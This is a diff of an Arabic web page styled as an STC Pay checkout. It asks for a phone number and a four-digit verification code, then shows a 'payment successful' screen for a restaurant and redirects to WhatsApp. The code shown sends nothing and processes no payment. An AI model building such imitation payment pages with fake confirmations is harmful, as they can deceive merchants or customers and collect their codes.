@@ -2,174 +2,610 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
 <title>STC Pay</title>
 
 <style>
-:root{
-  --stc-green: linear-gradient(135deg,#1fd18b,#7ae582);
-  --border:#e5e7eb;
-  --text:#374151;
+:root {
+  --stc-green: linear-gradient(135deg, #1fd18b, #7ae582);
+  --stc-green-solid: #1fd18b;
+  --border: #e5e7eb;
+  --text: #374151;
+  --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+  --radius: 16px;
 }
 
-body{
-  margin:0;
-  background:#f3f4f6;
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
+* {
+  box-sizing: border-box;
 }
 
-/* ===== Main Card ===== */
-.container{
-  max-width:420px;
-  margin:40px auto;
-  background:#fff;
-  border-radius:22px;
-  padding:26px;
-  box-shadow:0 20px 50px rgba(0,0,0,.1);
+body {
+  margin: 0;
+  background: #f3f4f6;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+}
 
-  /* 🔴 الحل النهائي لمشكلة الزوايا */
-  overflow:hidden;
+/* ===== Main Container ===== */
+.container {
+  width: 100%;
+  max-width: 420px;
+  background: #fff;
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  overflow: hidden;
+  position: relative;
 }
 
 /* ===== Header ===== */
-.header{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  margin:-26px;
-  margin-bottom:24px;
-  padding:26px;
-  border-bottom:1px solid #f1f1f1;
-  background:#fff;
+.header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 20px;
+  border-bottom: 1px solid #f1f1f1;
+  background: #fff;
+  flex-wrap: wrap;
+  gap: 12px;
 }
 
-.brand{
-  display:flex;
-  align-items:center;
-  gap:12px;
+.brand {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  flex: 1;
+  min-width: 0;
 }
 
-.logo{
-  width:48px;
-  height:48px;
-  border-radius:14px;
-  background:var(--stc-green);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:#fff;
-  font-weight:700;
+.logo {
+  width: 48px;
+  height: 48px;
+  border-radius: 14px;
+  background: var(--stc-green);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #fff;
+  font-weight: 700;
+  font-size: 18px;
+  flex-shrink: 0;
 }
 
-.brand h2{
-  margin:0;
-  font-size:18px;
+.brand h2 {
+  margin: 0;
+  font-size: 18px;
+  color: #111827;
 }
 
-.merchant{
-  font-size:13px;
-  color:#555;
-  line-height:1.4;
-  text-align:left;
+.merchant {
+  font-size: 13px;
+  color: #555;
+  line-height: 1.4;
+  text-align: left;
+  padding: 8px 0;
 }
 
 /* ===== Order Summary ===== */
 .order-summary {
   background: #f8f9fa;
   border-radius: 12px;
-  padding: 16px;
-  margin-bottom: 20px;
+  padding: 18px;
+  margin: 20px;
   border: 1px solid #e9ecef;
 }
 
 .order-summary h4 {
-  margin: 0 0 12px 0;
+  margin: 0 0 16px 0;
   color: #2d3748;
-  font-size: 16px;
+  font-size: 17px;
+  font-weight: 600;
 }
 
 .order-detail {
   display: flex;
   justify-content: space-between;
-  margin-bottom: 8px;
-  font-size: 14px;
+  margin-bottom: 10px;
+  font-size: 15px;
+  color: #4a5568;
+  padding: 6px 0;
 }
 
 .order-detail.total {
-  margin-top: 12px;
-  padding-top: 12px;
+  margin-top: 14px;
+  padding-top: 14px;
   border-top: 2px solid #e2e8f0;
   font-weight: 700;
   color: #1a202c;
-  font-size: 18px;
+  font-size: 19px;
 }
 
-/* ===== Form ===== */
-.label{
-  font-size:14px;
-  margin-bottom:6px;
-  color:var(--text);
+/* ===== Form Sections ===== */
+.form-section {
+  padding: 0 20px;
+  margin-bottom: 24px;
 }
 
-input{
-  width:100%;
-  padding:15px;
-  border-radius:12px;
-  border:1px solid var(--border);
-  font-size:16px;
-  outline:none;
+.label {
+  font-size: 15px;
+  margin-bottom: 8px;
+  color: var(--text);
+  font-weight: 500;
+  display: block;
 }
 
-input:focus{
-  border-color:#1fd18b;
+input {
+  width: 100%;
+  padding: 16px 18px;
+  border-radius: 12px;
+  border: 1px solid var(--border);
+  font-size: 16px;
+  outline: none;
+  background: #fff;
+  transition: all 0.2s ease;
+  font-family: inherit;
+}
+
+input:focus {
+  border-color: var(--stc-green-solid);
+  box-shadow: 0 0 0 3px rgba(31, 209, 139, 0.1);
+}
+
+input::placeholder {
+  color: #9ca3af;
 }
 
 /* ===== Buttons ===== */
-button{
-  width:100%;
-  margin-top:22px;
-  padding:16px;
-  border:none;
-  border-radius:14px;
-  font-size:16px;
-  font-weight:600;
-  color:#fff;
-  background:#d1d5db;
-  cursor:not-allowed;
-  transition:.3s;
+button {
+  width: calc(100% - 40px);
+  margin: 22px 20px 0;
+  padding: 18px;
+  border: none;
+  border-radius: 14px;
+  font-size: 17px;
+  font-weight: 600;
+  color: #fff;
+  background: #d1d5db;
+  cursor: not-allowed;
+  transition: all 0.3s ease;
+  display: block;
 }
 
-button.active{
-  background:var(--stc-green);
-  cursor:pointer;
+button.active {
+  background: var(--stc-green);
+  cursor: pointer;
+  box-shadow: 0 4px 15px rgba(31, 209, 139, 0.3);
+}
+
+button.active:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(31, 209, 139, 0.4);
+}
+
+button.active:active {
+  transform: translateY(0);
 }
 
 /* ===== Utility ===== */
-.hidden{display:none;}
-.center{text-align:center;}
+.hidden {
+  display: none !important;
+}
 
-.status{
-  margin-top:25px;
-  color:var(--text);
-  font-size:15px;
+.center {
+  text-align: center;
+}
+
+/* ===== Status Messages ===== */
+.status {
+  margin: 25px 20px;
+  color: var(--text);
+  font-size: 16px;
+  text-align: center;
+  padding: 16px;
+  background: #f8f9fa;
+  border-radius: 12px;
+  border: 1px solid #e9ecef;
 }
 
 /* ===== Success ===== */
-.success h3{
-  color:#1fd18b;
-  font-size:22px;
-  margin-bottom:10px;
+.success {
+  padding: 20px;
+  text-align: center;
+}
+
+.success h3 {
+  color: var(--stc-green-solid);
+  font-size: 24px;
+  margin: 20px 0 12px;
+}
+
+.success p {
+  color: #4b5563;
+  font-size: 16px;
+  margin: 12px 0;
+  line-height: 1.5;
+}
+
+.success-info {
+  font-size: 14px;
+  color: #6b7280;
+  margin-top: 20px;
+  padding: 12px;
+  background: #f9fafb;
+  border-radius: 10px;
 }
 
 /* ===== Redirect Message ===== */
 .redirect-message {
-  margin-top: 20px;
-  padding: 12px;
+  margin: 25px 0 10px;
+  padding: 16px;
   background: #edf2f7;
-  border-radius: 8px;
+  border-radius: 10px;
   color: #4a5568;
-  font-size: 13px;
+  font-size: 14px;
   text-align: center;
+  line-height: 1.5;
+  border: 1px solid #e2e8f0;
+}
+
+/* ===== Mobile-Specific Styles ===== */
+
+/* Small phones (max-width: 375px) */
+@media (max-width: 375px) {
+  body {
+    padding: 12px;
+    align-items: flex-start;
+    padding-top: 20px;
+  }
+  
+  .container {
+    border-radius: 14px;
+  }
+  
+  .header {
+    padding: 16px;
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 10px;
+  }
+  
+  .brand {
+    width: 100%;
+  }
+  
+  .merchant {
+    width: 100%;
+    text-align: right;
+    padding-top: 8px;
+    border-top: 1px solid #eee;
+    margin-top: 8px;
+  }
+  
+  .order-summary {
+    margin: 16px;
+    padding: 16px;
+  }
+  
+  .order-summary h4 {
+    font-size: 16px;
+  }
+  
+  .order-detail {
+    font-size: 14px;
+  }
+  
+  .order-detail.total {
+    font-size: 18px;
+  }
+  
+  .form-section {
+    padding: 0 16px;
+  }
+  
+  input {
+    padding: 14px 16px;
+    font-size: 15px;
+  }
+  
+  button {
+    width: calc(100% - 32px);
+    margin: 20px 16px 0;
+    padding: 16px;
+    font-size: 16px;
+  }
+  
+  .success {
+    padding: 16px;
+  }
+  
+  .success h3 {
+    font-size: 22px;
+  }
+}
+
+/* Extra small phones (max-width: 320px) */
+@media (max-width: 320px) {
+  body {
+    padding: 10px;
+  }
+  
+  .container {
+    border-radius: 12px;
+  }
+  
+  .header {
+    padding: 14px;
+  }
+  
+  .logo {
+    width: 44px;
+    height: 44px;
+    font-size: 16px;
+  }
+  
+  .brand h2 {
+    font-size: 16px;
+  }
+  
+  .order-summary {
+    margin: 14px;
+    padding: 14px;
+  }
+  
+  input {
+    padding: 12px 14px;
+    font-size: 15px;
+  }
+  
+  button {
+    padding: 15px;
+    font-size: 15px;
+  }
+}
+
+/* Tablet and larger devices (min-width: 768px) */
+@media (min-width: 768px) {
+  body {
+    padding: 30px;
+  }
+  
+  .container {
+    max-width: 480px;
+    border-radius: 20px;
+  }
+  
+  .header {
+    padding: 24px;
+  }
+  
+  .order-summary {
+    margin: 24px;
+    padding: 22px;
+  }
+  
+  .form-section {
+    padding: 0 24px;
+  }
+  
+  button {
+    width: calc(100% - 48px);
+    margin: 24px 24px 0;
+  }
+  
+  .success {
+    padding: 30px 24px;
+  }
+  
+  .success h3 {
+    font-size: 26px;
+  }
+}
+
+/* Desktop (min-width: 1024px) */
+@media (min-width: 1024px) {
+  body {
+    padding: 40px;
+  }
+  
+  .container {
+    max-width: 500px;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.12);
+  }
+  
+  .success h3 {
+    font-size: 28px;
+  }
+}
+
+/* Landscape mode for phones */
+@media (max-height: 600px) and (orientation: landscape) {
+  body {
+    align-items: flex-start;
+    padding-top: 20px;
+    padding-bottom: 20px;
+  }
+  
+  .container {
+    max-height: 90vh;
+    overflow-y: auto;
+  }
+}
+
+/* Print styles */
+@media print {
+  body {
+    background: white;
+    padding: 0;
+  }
+  
+  .container {
+    box-shadow: none;
+    max-width: 100%;
+    margin: 0;
+    border-radius: 0;
+  }
+  
+  button,
+  input,
+  .redirect-message {
+    display: none;
+  }
+  
+  .order-summary {
+    border: 2px solid #000;
+  }
+}
+
+/* Accessibility improvements */
+@media (prefers-reduced-motion: reduce) {
+  button,
+  button.active:hover,
+  button.active:active,
+  input {
+    transition: none;
+    transform: none;
+  }
+}
+
+/* Dark mode support */
+@media (prefers-color-scheme: dark) {
+  :root {
+    --border: #4b5563;
+    --text: #e5e7eb;
+  }
+  
+  body {
+    background: #111827;
+  }
+  
+  .container {
+    background: #1f2937;
+  }
+  
+  .header {
+    background: #1f2937;
+    border-bottom-color: #374151;
+  }
+  
+  .brand h2 {
+    color: #f9fafb;
+  }
+  
+  .merchant {
+    color: #d1d5db;
+  }
+  
+  .order-summary {
+    background: #374151;
+    border-color: #4b5563;
+  }
+  
+  .order-summary h4,
+  .order-detail,
+  .order-detail.total {
+    color: #f3f4f6;
+  }
+  
+  input {
+    background: #374151;
+    border-color: #4b5563;
+    color: #f9fafb;
+  }
+  
+  input::placeholder {
+    color: #9ca3af;
+  }
+  
+  input:focus {
+    border-color: var(--stc-green-solid);
+    box-shadow: 0 0 0 3px rgba(31, 209, 139, 0.2);
+  }
+  
+  .status {
+    background: #374151;
+    border-color: #4b5563;
+    color: #e5e7eb;
+  }
+  
+  .success h3 {
+    color: var(--stc-green-solid);
+  }
+  
+  .success p {
+    color: #d1d5db;
+  }
+  
+  .success-info {
+    background: #374151;
+    color: #9ca3af;
+  }
+  
+  .redirect-message {
+    background: #374151;
+    border-color: #4b5563;
+    color: #d1d5db;
+  }
+}
+
+/* High contrast mode */
+@media (prefers-contrast: high) {
+  :root {
+    --stc-green: linear-gradient(135deg, #00a86b, #00cc7a);
+    --stc-green-solid: #00a86b;
+  }
+  
+  button.active {
+    border: 2px solid #000;
+  }
+  
+  input:focus {
+    border-width: 2px;
+  }
+}
+
+/* Animation for step transitions */
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.form-section,
+.order-summary,
+.status,
+.success {
+  animation: fadeIn 0.3s ease-out;
+}
+
+/* Loading animation for sending state */
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.6; }
+}
+
+#sending .status {
+  animation: pulse 1.5s infinite ease-in-out;
+}
+
+/* Fix for iOS input zoom */
+@media (max-width: 768px) {
+  input {
+    font-size: 16px; /* Prevents iOS zoom on focus */
+  }
+}
+
+/* Fix for mobile keyboard covering content */
+@media (max-height: 500px) {
+  body {
+    align-items: flex-start;
+  }
+  
+  .container {
+    margin-top: 10px;
+    margin-bottom: 10px;
+  }
 }
 </style>
 </head>
@@ -199,42 +635,46 @@ button.active{
   </div>
 
   <!-- STEP 1: Phone -->
-  <div id="step1">
-    <div class="label">رقم الجوال</div>
+  <div id="step1" class="form-section">
+    <label class="label" for="phone">رقم الجوال</label>
     <input
       type="tel"
       id="phone"
       placeholder="05XXXXXXXX"
       oninput="checkPhone()"
+      inputmode="numeric"
+      pattern="[0-9]*"
     >
     <button id="sendBtn" onclick="sendToStc()">تم الإرسال إلى STC Pay</button>
   </div>
 
   <!-- STEP 2: Sending -->
-  <div id="sending" class="hidden center">
+  <div id="sending" class="hidden">
     <div class="status">جاري التحقق من العملية…</div>
   </div>
 
   <!-- STEP 3: OTP -->
-  <div id="otpStep" class="hidden">
-    <div class="label">رمز التحقق (4 أرقام)</div>
+  <div id="otpStep" class="hidden form-section">
+    <label class="label" for="otp">رمز التحقق (4 أرقام)</label>
     <input
       type="text"
       id="otp"
       maxlength="4"
       placeholder="••••"
       oninput="checkOtp()"
+      inputmode="numeric"
+      pattern="[0-9]*"
     >
     <button id="otpBtn" onclick="confirmOtp()">تأكيد</button>
   </div>
 
   <!-- STEP 4: Success -->
-  <div id="success" class="hidden center success">
+  <div id="success" class="hidden success">
     <h3>✅ تم الدفع بنجاح</h3>
     <p>شكراً لاستخدامك STC Pay</p>
-    <p style="font-size:13px;color:#6b7280;">
+    <div class="success-info">
       تجار بلس – مطعم جو كرسبي
-    </p>
+    </div>
     <div class="redirect-message">
       جاري العودة إلى WhatsApp مع ملخص الطلب...
     </div>
@@ -286,42 +726,50 @@ function redirectToWhatsApp() {
   }, 3000); // 3 seconds delay to show success message
 }
 
-function checkPhone(){
-  const phone=document.getElementById("phone").value;
-  const btn=document.getElementById("sendBtn");
-  if(phone.length>=9){
+function checkPhone() {
+  const phone = document.getElementById("phone").value;
+  const btn = document.getElementById("sendBtn");
+  
+  // Clean phone number (remove any non-digit characters)
+  const cleanPhone = phone.replace(/\D/g, '');
+  
+  if (cleanPhone.length >= 9) {
     btn.classList.add("active");
-    btn.disabled=false;
-  }else{
+    btn.disabled = false;
+  } else {
     btn.classList.remove("active");
-    btn.disabled=true;
+    btn.disabled = true;
   }
 }
 
-function sendToStc(){
+function sendToStc() {
   document.getElementById("step1").classList.add("hidden");
   document.getElementById("sending").classList.remove("hidden");
 
-  // انتقال تلقائي إلى OTP بعد ثانيتين
-  setTimeout(()=>{
+  // Auto transition to OTP after 2 seconds
+  setTimeout(() => {
     document.getElementById("sending").classList.add("hidden");
     document.getElementById("otpStep").classList.remove("hidden");
-  },2000);
+  }, 2000);
 }
 
-function checkOtp(){
-  const otp=document.getElementById("otp").value;
-  const btn=document.getElementById("otpBtn");
-  if(otp.length===4){
+function checkOtp() {
+  const otp = document.getElementById("otp").value;
+  const btn = document.getElementById("otpBtn");
+  
+  // Only allow numbers
+  document.getElementById("otp").value = otp.replace(/\D/g, '');
+  
+  if (otp.length === 4) {
     btn.classList.add("active");
-    btn.disabled=false;
-  }else{
+    btn.disabled = false;
+  } else {
     btn.classList.remove("active");
-    btn.disabled=true;
+    btn.disabled = true;
   }
 }
 
-function confirmOtp(){
+function confirmOtp() {
   document.getElementById("otpStep").classList.add("hidden");
   document.getElementById("success").classList.remove("hidden");
   
@@ -332,6 +780,46 @@ function confirmOtp(){
 // Initialize page
 window.onload = function() {
   displayOrderSummary();
+  
+  // Focus on phone input
+  document.getElementById("phone").focus();
+  
+  // Add keyboard event listeners for better UX
+  document.getElementById("phone").addEventListener("keydown", function(e) {
+    if (e.key === "Enter" && this.value.replace(/\D/g, '').length >= 9) {
+      e.preventDefault();
+      sendToStc();
+    }
+  });
+  
+  document.getElementById("otp").addEventListener("keydown", function(e) {
+    if (e.key === "Enter" && this.value.length === 4) {
+      e.preventDefault();
+      confirmOtp();
+    }
+  });
+  
+  // Handle window resize for better mobile experience
+  window.addEventListener('resize', function() {
+    // Adjust layout for very small screens
+    if (window.innerWidth <= 320) {
+      document.querySelectorAll('input').forEach(input => {
+        input.style.padding = "12px 14px";
+      });
+    } else {
+      document.querySelectorAll('input').forEach(input => {
+        input.style.padding = "";
+      });
+    }
+  });
+  
+  // Handle orientation change
+  window.addEventListener('orientationchange', function() {
+    // Small delay to ensure proper rendering after rotation
+    setTimeout(function() {
+      window.scrollTo(0, 0);
+    }, 100);
+  });
 };
 </script>
 
